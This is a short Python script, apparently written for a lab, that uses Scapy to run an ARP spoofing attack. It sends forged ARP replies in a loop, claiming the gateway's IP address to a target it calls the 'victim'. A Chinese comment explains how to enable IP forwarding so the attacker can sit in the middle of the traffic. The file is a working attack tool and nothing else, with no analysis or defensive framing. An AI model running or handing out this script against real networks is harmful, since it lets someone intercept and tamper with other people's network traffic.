from scapy.all import  *
import time
# 要先开启Linux的转发功能 echo 1 >> /proc/sys/net/ipv4/ip_forward
def main():
    gatewayIP = "192.168.64.2"
    victimIP = "192.168.64.129"

    hackMAC = "00:0c:29:65:f3:db"
    victimMAC = "00:0c:29:f6:d1:d5"

    # print(getmacbyip("192.168.64.128"))
    packet = Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())
if __name__ == '__main__':
    main()